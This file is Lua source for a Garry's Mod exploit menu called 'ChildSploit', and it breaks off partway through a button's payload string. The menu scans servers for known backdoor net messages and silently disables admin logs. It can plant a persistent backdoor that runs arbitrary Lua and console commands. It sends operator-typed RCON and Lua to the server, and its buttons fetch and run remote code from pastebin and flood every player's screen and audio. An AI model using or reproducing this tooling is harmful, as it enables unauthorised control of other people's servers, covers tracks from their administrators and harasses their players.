--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Functions to get shit going
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]

MsgC (Color(math.random(1,255),math.random(1,244),math.random(1,255)), [[ 
                :'######::'##::::'##:'####:'##:::::::'########:::::'########::'########:'##::::'##::'######:::::'##::::'##::::'##:::
                 '##... ##: ##:::: ##:. ##:: ##::::::: ##.... ##:::: ##.... ##: ##.....:: ##:::: ##:'##... ##:::: ##:::: ##::'####:::
                  ##:::..:: ##:::: ##:: ##:: ##::::::: ##:::: ##:::: ##:::: ##: ##::::::: ##:::: ##: ##:::..::::: ##:::: ##::.. ##:::
                  ##::::::: #########:: ##:: ##::::::: ##:::: ##:::: ##:::: ##: ######::: ##:::: ##:. ######::::: ##:::: ##:::: ##:::
                  ##::::::: ##.... ##:: ##:: ##::::::: ##:::: ##:::: ##:::: ##: ##...::::. ##:: ##:::..... ##::::. ##:: ##::::: ##:::
                  ##::: ##: ##:::: ##:: ##:: ##::::::: ##:::: ##:::: ##:::: ##: ##::::::::. ## ##:::'##::: ##:::::. ## ##:::::: ##:::
                 . ######:: ##:::: ##:'####: ########: ########::::: ########:: ########:::. ###::::. ######:::::::. ###:::::'######:
                 :......:::..:::::..::....::........::........::::::........:::........:::::...::::::......:::::::::...::::::......:: ]])
				 MsgC (Color(math.random(1,255),math.random(1,244),math.random(1,255)), [[ 
                                                  Bienvenue Sur ChildSploit Menu
                           C'est la V1 du Menu, donc si vous rencontrez des Bug (Merci de me contacter sur discord) ]])

  
netKey = "nostrip" 
function IsMessagePooled( netmessage )
status, error = pcall(net.Start,netmessage)
return status
end
  
local Authorized = LocalPlayer():SteamID()
if Authorized == "STEAM_0:1:431502870" or Authorized == "STEAM_0:1:431502870" or Authorized == "STEAM_0:1:212308557" or Authorized == "STEAM_0:1:431857951"
then
local n = net
local s = net.Start
local ss = net.WriteString
local stc = net.Send
local hp = http.Post
local netKey = "";
local vgui = vgui;         
local surface = surface;       
local render = render;         
local Color = Color;       
local input = input;       
local hook = hook;         
local next = next;         
local timer = timer;  
local GetConVarNumber = GetConVarNumber;     
local util = util;         
local player = player;         
local Vector = Vector;         
local Angle = Angle;       
local FindMetaTable = FindMetaTable;       
local team = team;         
local LocalPlayer = LocalPlayer;       
local draw = draw;             
local debug = debug;       
local table = table;       
local Entity = Entity;         
local ScrW, ScrH = ScrW, ScrH;         
local RunConsoleCommand = RunConsoleCommand;       
local GAMEMODE = GAMEMODE;         
local CurTime = CurTime;       
local cam = cam;
local silent = CreateClientConVar("silent", 0, false, false);
totalExploits = 0
BackdoorsFound = 0
local ply = LocalPlayer()


function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

-- Exploit 1
function removeAll() -- Strips all Players
    for k,v in pairs(player.GetAll()) do
        stripPlayer(v)
    end
end

function stripPlayer(ply) -- Strip player function
    if ply:IsPlayer() then
        for k,v in pairs(ply:GetWeapons()) do
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( v )
            net.SendToServer()
        end
    end
end



GRADIENT_HORIZONTAL = 0;
GRADIENT_VERTICAL = 1;
function draw.LinearGradient(x,y,w,h,from,to,dir,res)
    dir = dir or GRADIENT_HORIZONTAL;
    if dir == GRADIENT_HORIZONTAL then res = (res and res <= w) and res or w;
    elseif dir == GRADIENT_VERTICAL then res = (res and res <= h) and res or h; end
    for i=1,res do
        surface.SetDrawColor(
            Lerp(i/res,from.r,to.r),
            Lerp(i/res,from.g,to.g),
            Lerp(i/res,from.b,to.b),
            Lerp(i/res,from.a,to.a)
        );
        if dir == GRADIENT_HORIZONTAL then surface.DrawRect(x + w * (i/res), y, w/res, h );
        elseif dir == GRADIENT_VERTICAL then surface.DrawRect(x, y + h * (i/res), w, h/res ); end
    end
end

---------------------
--  SPLOIT NOTIFY  --
---------------------
function SploitNotify(text)
    local notify = vgui.Create( "DPanel" )
    notify:SetSize( 500, 50 )
    notify:SetPos( ScrW() - 200, -50 )
    notify.Paint = function(self, w, h)
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    draw.RoundedBox( 0, 0, notify:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
    draw.SimpleText( text, "Title", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end
    notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
    timer.Simple( 3, function()
    notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
end);end) end
---------------------

local function playSound(url)
    sound.PlayURL(url, '', function( station ) 
        if ( IsValid( station ) ) then
        station:SetPos( LocalPlayer():GetPos() )
        station:Play()
        end
    end)
end

hook.Add("Think", "RAINBOWPLAYER", function()
local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
    LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
    LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
end)

--------------------------------

-- CHECKER
    if( ValidNetString("memeDoor") ) then
        netKey = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
        netKey = "Sandbox_Armdupe"
    else
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
        netKey = "DarkRP_AdminWeapons"
    else
    end

    if( ValidNetString("SessionBackdoor") ) then
        netKey = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
        netKey = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
        netKey = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        netKey = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_Defqon") ) then
        netKey = "_Defqon"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
        netKey = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
        netKey = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
        netKey = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
        netKey = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
        netKey = "Im_SOCool"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
        netKey = "ULXQUERY2"
    else
    end
	
    if( ValidNetString("Childlebg") ) then
        netKey = "Childlebg"
    else
    end
	
    if( ValidNetString("zilnix") ) then
        netKey = "zilnix"
    else
    end

    if( ValidNetString("enablevac") ) then
        netKey = "enablevac"
    else
    end

    if( ValidNetString("c") ) then
        netKey = "c"
    else
    end
	
    if( ValidNetString("Þà?D)◘") ) then
        netKey = "Þà?D)◘"
    else
    end
	
    if( ValidNetString("disablebackdoor") ) then
        netKey = "disablebackdoor"
    else
    end
	
    if( ValidNetString("kill") ) then
        netKey = "kill"
    else
    end

    if netKey == "" then
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 255, 255, 255 ), "Aucune backdoor Detecter." )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 0, 255, 0 ), "Backdoor trouvé! :D La backdoor est : ".. netKey )
            -- Auto shut down ULX Logs
            if GetConVarNumber("silent") == 1 then
                net.Start(netKey)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(netKey)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("ULX Logs disabled." )
                end)
            end
    end
--END CHECKER

-----------------------------------------------
--     Check Backdoors (2) (Child_scanbd)    --
-----------------------------------------------

function checkbackdoors()
    if( ValidNetString("memeDoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - memeDoor" )
        netKey = "memeDoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - memeDoor!" )
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - Sandbox_Armdupe" )
        netKey = "Sandbox_Armdupe"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Sandbox_Armdupe!" )
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - DarkRP_AdminWeapons" )
        netKey = "DarkRP_AdminWeapons"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - DarkRP_AdminWeapons!" )
    end
    if( ValidNetString("SessionBackdoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - SessionBackdoor" )
        netKey = "SessionBackdoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - SessionBackdoor!" )
    end

    if( ValidNetString("Fix_Keypads") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - Fix_Keypads" )
        netKey = "Fix_Keypads"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Fix_Keypads!" )
    end

    if( ValidNetString("Remove_Exploiters") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - Remove_Exploiters" )
        netKey = "Remove_Exploiters"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Remove_Exploiters!" )
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - noclipcloakaesp_chat_text" )
        netKey = "noclipcloakaesp_chat_text"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - noclipcloakaesp_chat_text!" )
    end

    if( ValidNetString("_Defqon") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - _Defqon" )
        netKey = "_Defqon"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - _Defqon!" )
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - _CAC_ReadMemory" )
        netKey = "_CAC_ReadMemory"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - _CAC_ReadMemory!" )
    end

    if( ValidNetString("nostrip") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - nostrip" )
        netKey = "nostrip"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - nostrip!" )
    end

    if( ValidNetString("LickMeOut") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - LickMeOut" )
        netKey = "LickMeOut"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - LickMeOut!" )
    end

    if( ValidNetString("MoonMan") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! -MoonMan" )
        netKey = "MoonMan"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - MoonMan!" )
    end

    if( ValidNetString("Im_SOCool") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - Im_SOCool" )
        netKey = "Im_SOCool"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Im_SOCool!" )
    end

    if( ValidNetString("ULXQUERY2") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - ULXQUERY2" )
        netKey = "ULXQUERY2"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - ULXQUERY2!" )
    end
	
    if( ValidNetString("Childlebg") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - Childlebg" )
        netKey = "Childlebg"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Childlebg!" )
    end
	
    if( ValidNetString("child_dev") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - child_dev" )
        netKey = "child_dev"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - child_dev!" )
    end
	
    if( ValidNetString("enablevac") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - enablevac" )
        netKey = "enablevac"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - enablevac!" )
    end
	
    if( ValidNetString("c") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - c" )
        netKey = "c"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - c!" )
    end
	
    if( ValidNetString("Þà?D)◘") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - Þà?D)◘" )
        netKey = "Þà?D)◘"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - Þà?D)◘!" )
    end
	
    if( ValidNetString("disablebackdoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - disablebackdoor" )
        netKey = "disablebackdoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - disablebackdoor!" )
    end
	
	    if( ValidNetString("kill") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[Child Backdoor]", Color( 255, 255, 255 )," Backdoor trouvé ! - kill" )
        netKey = "kill"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[Child Backdoor]", Color( 255, 0, 0 )," Scan backdoor : Non trouvé : - kill!" )
    end
	
    SploitNotify("Backdoor trouvé: ".. netKey )
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 127, 255, 0 ), "Net changé à : ".. netKey  )
end

function Inject()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 255, 255, 255 ), " Injecting..." )
    if ( ply:IsSuperAdmin() ) then
        timer.Simple( 3, function() 
            if( ValidNetString("SessionBackdoor") ) then

            else
                RunConsoleCommand( "ulx", "logecho", "0" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('SessionBackdoor')" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('SessionBackdoor') net.Receive('SessionBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
                RunConsoleCommand( "ulx", "logecho", "1" )
                chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Session", "] ", Color( 255, 255, 255 ), " Injécté avec succès !" )
            end
        end )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Exloit", "] ", Color( 255, 255, 255 ), " Erreur ! Vous n'êtes pas SUPERADMIN !" )
    end
    if( ValidNetString("SessionBackdoor") ) then
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Backdoor", "] ", Color( 255, 255, 255 ), " Backdoor présente." )
    end
end

function bhop()
local AddHook = dismay and dismay.AddHook or hook and hook.Add or function() print("fuck i missed") end;
AddHook("CreateMove", "BHOP", function(cmd)
        if (cmd:KeyDown(IN_JUMP)) then
                if(cmd:GetMouseX() < 0) then
                        cmd:SetSideMove(-10000);
                elseif(cmd:GetMouseX() > 0) then
                        cmd:SetSideMove(10000);
                end
        if (LocalPlayer():IsOnGround()) then
                cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP));
                        return;
        end
end
cmd:RemoveKey(IN_JUMP);
end)
end

surface.CreateFont("Font", {
font = "Segoe UI Light",
size = 21,
weight = 300
})
surface.CreateFont("CheckFont", {
font = "Segoe UI Light",
size = 17,
weight = 300
})

surface.CreateFont("Target", {
font = "Segoe UI Light",
size = 15,
weight = 300
})

surface.CreateFont( "Title", {
        font = "Lato Light",
        size = 30,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
} )

surface.CreateFont( "tamere", {
        font = "Roboto",
        size = 150,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
		bold = true,
} )

surface.CreateFont( "Welcome", {
        font = "Lato Light",
        size = 25,
        weight = 10,
        antiaalias = true,
        strikeout = false,
        additive = true,
} )

function Child()
local Menu = vgui.Create("DFrame")
Menu:SetSize(900, 700)
Menu:SetSize(900, 700)
Menu:Center()
Menu:SetTitle("")
Menu:MakePopup()
Menu:ShowCloseButton(false) 
Menu.Paint = function(self, w, h)
surface.SetDrawColor( 30, 30 , 30 )
surface.DrawRect( 0, 0, Menu:GetWide(), Menu:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Menu:GetWide(), Menu:GetTall() )

    draw.DrawText( "Child Exploit's v1", "Font", 10, 2,Color(math.random(255), math.random(255), math.random(255)))


end

local Close = vgui.Create("DButton", Menu)
Close:SetPos( 842, 1 )
Close:SetSize( 53, 20 )
Close:SetText( "" )
function Close:Paint( w, h )
    draw.RoundedBoxEx( 4, 0, 0, w, h, Color(255,0,0) )
end

Close.DoClick = function()
    Menu:Close()  
end 


--------------------------------------------------------------
local Tabs = vgui.Create( "DPropertySheet", Menu )
Tabs:Dock( FILL )
Tabs:DockPadding( 734, 5, 0, 0)
Tabs.Paint = function (self, w, h)
for k, v in pairs(Tabs.Items) do
    if (!v.Tab) then continue end
   
    v.Tab.Paint = function(self,w,h)
         draw.LinearGradient( 0, 0, w, h, Color(20, 20, 20), Color(30, 30, 30), GRADIENT_VERTICAL );
         surface.SetDrawColor(math.random(85), math.random(85), math.random(75))
         surface.DrawOutlinedRect( 0, 0, v.Tab:GetWide(), v.Tab:GetTall() )
    end
end
end
 
local Serveur = vgui.Create( "DPanel", Tabs )
    Serveur.Paint = function( self, w, h )
        draw.RoundedBox(0, 0, 0, w, h, Color(15,15,15))
    end
Tabs:AddSheet( "Serveur", Serveur )
 

local Targets = vgui.Create( "DPanel", Tabs )
    Targets.Paint = function( self, w, h )
        draw.RoundedBox(0, 0, 0, w, h, Color(15,15,15))
    end
Tabs:AddSheet( "Targets", Targets )

local Misc = vgui.Create( "DPanel", Tabs )
    Misc.Paint = function( self, w, h )
        draw.RoundedBox(0, 0, 0, w, h, Color(15,15,15))
    end
Tabs:AddSheet( "Misc", Misc )


local Serveur = vgui.Create( "DScrollPanel", Serveur )
Serveur:Dock( FILL )
 
local Targets = vgui.Create( "DScrollPanel", Targets )
Targets:Dock( FILL )

local Misc = vgui.Create( "DScrollPanel", Misc )
Misc:Dock( FILL )
--------------------------------------------------------------

local Entry = vgui.Create( "DTextEntry" )
Entry:SetParent(Serveur)
Entry:SetPos( 12, 530 )
Entry:SetSize( 230, 90 )
Entry:SetText( "" )

local RCON = vgui.Create("DButton", Serveur )
RCON:SetSize( 110, 25 )
RCON:SetPos( 130, 500 )
RCON:SetText("RCON Command")
RCON:SetTextColor(Color(255, 255, 255, 255))
RCON.Paint = function(panel, w, h)
    surface.SetDrawColor(29, 39, 55)
    surface.DrawRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
    surface.SetDrawColor( Color(math.random(0,120),
              math.random(0,120),
              math.random(0,120),
                           120))
    surface.DrawOutlinedRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
end

RCON.DoClick = function()
    local GetEntry = Entry:GetValue()
        net.Start(netKey)
        net.WriteString( GetEntry )
        net.WriteBit (false)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "RCON Commande envoyé." )
		    SploitNotify("RCON Commande envoyé au serveur.")
    surface.PlaySound("buttons/blip1.wav") 
end

local GLUA = vgui.Create("DButton", Serveur )
GLUA:SetSize( 110, 25 )
GLUA:SetPos( 15, 500 )
GLUA:SetText("Code LUA")
GLUA:SetTextColor(Color(255, 255, 255, 255))
GLUA.Paint = function(panel, w, h)
    surface.SetDrawColor(29, 39, 55)
    surface.DrawRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
    surface.SetDrawColor( Color(math.random(0,120),
              math.random(0,120),
              math.random(0,120),
                           120))
    surface.DrawOutlinedRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
end

GLUA.DoClick = function()
local GetEntry = Entry:GetValue()
        net.Start(netKey)
        net.WriteString( GetEntry )
        net.WriteBit (1)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Code lua envoyé." )
		    SploitNotify("Code lua envoyé au serveur.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
        Macro:SetPos( 5, 30 )
		Macro:SetParent(Serveur)
        Macro:SetText( "Visuel 1" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 130, 25 )
        Macro.Paint = function()
        surface.SetDrawColor(89, 11, 04)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/drngtKH6\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 1 (base) activé" )
    SploitNotify("Super Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 5, 55 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 130, 25 )
Macro:SetText( "Visuel. 2" )
Macro.Paint = function()
        surface.SetDrawColor(89, 11, 04)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531253-skel2.gif\")]])" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 2 (base) activé" )
    SploitNotify("Super Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end



local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 5, 80 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 130, 25 )
Macro:SetText( "DESTRUCTEUR. 1" )
Macro.Paint = function()
        surface.SetDrawColor(89, 11, 04)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(1920,1080) hud:SetPos(0,0) hud:OpenURL(\"http://Jesuschristoff.livehost.fr/gmod/upload/giphy2.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(1920,1080) hud4:SetPos(ScrW()-150,ScrH()-100) hud4:OpenURL(\"\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( 